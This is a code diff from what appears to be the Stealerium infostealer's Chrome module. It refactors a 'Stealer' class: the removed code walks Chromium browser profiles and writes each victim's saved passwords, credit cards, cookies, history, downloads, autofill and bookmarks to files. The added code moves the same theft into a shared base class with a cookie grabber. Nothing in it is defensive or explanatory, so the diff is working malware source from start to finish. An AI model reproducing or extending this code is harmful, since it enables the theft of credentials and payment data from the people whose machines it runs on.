@@ -328,73 +328,20 @@ namespace Stealerium.Stub.Target.Browsers.Chromium
     }
 
     // Stealer
-    internal sealed class RecoverChrome
+    internal sealed class RecoverChrome : ChromiumBasedBrowserRecovery
     {
-        public static void Run(string sSavePath)
+        public RecoverChrome(string savePath) : base(
+            savePath,
+            "Google Chrome",  
+            Path.Combine(Paths.Lappdata, "Google\\Chrome\\User Data"),
+            CdpCookieGrabber.BrowserType.Chrome)
         {
-            if (!Directory.Exists(sSavePath))
-                Directory.CreateDirectory(sSavePath);
+        }
 
-            foreach (var sPath in Paths.SChromiumPswPaths)
-            {
-                string sFullPath;
-                if (sPath.Contains("Opera Software"))
-                    sFullPath = Paths.Appdata + sPath;
-                else
-                    sFullPath = Paths.Lappdata + sPath;
-
-                if (Directory.Exists(sFullPath))
-                {
-                    Logging.Log($"Found browser directory: {sFullPath}");
-                    foreach (var sProfile in Directory.GetDirectories(sFullPath))
-                    {
-                        // Write chromium passwords, credit cards, cookies
-                        var sBDir = sSavePath + "\\" + Crypto.BrowserPathToAppName(sPath);
-                        Directory.CreateDirectory(sBDir);
-
-                        // Try to find cookies in new location first (Network/Cookies)
-                        string cookiesPath = Path.Combine(sProfile, "Network", "Cookies");
-                        if (!File.Exists(cookiesPath))
-                        {
-                            Logging.Log($"Cookies not found in new location: {cookiesPath}");
-                            // Fallback to old location
-                            cookiesPath = Path.Combine(sProfile, "Cookies");
-                            if (File.Exists(cookiesPath))
-                            {
-                                Logging.Log($"Found cookies in old location: {cookiesPath}");
-                            }
-                            else
-                            {
-                                Logging.Log($"Cookies not found in old location either: {cookiesPath}");
-                            }
-                        }
-                        else
-                        {
-                            Logging.Log($"Found cookies in new location: {cookiesPath}");
-                        }
-
-                        // Run tasks
-                        var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
-                        var pPasswords = Passwords.Get(sProfile + "\\Login Data");
-                        var pCookies = Cookies.Get(cookiesPath);
-                        var pHistory = History.Get(sProfile + "\\History");
-                        var pDownloads = Downloads.Get(sProfile + "\\History");
-                        var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
-                        var pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
-                        // Await values and write
-                        CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
-                        CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
-                        CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
-                        // Create a README.txt file in the directory
-                        CBrowserUtils.CreateReadme(sBDir, pPasswords);
-                        CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
-                        CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
-                        CBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
-                        CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
-                        CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
-                    }
-                }
-            }
+        public static void Run(string savePath)
+        {
+            var recovery = new RecoverChrome(savePath);
+            recovery.RecoverBrowserData();
         }
     }
 }
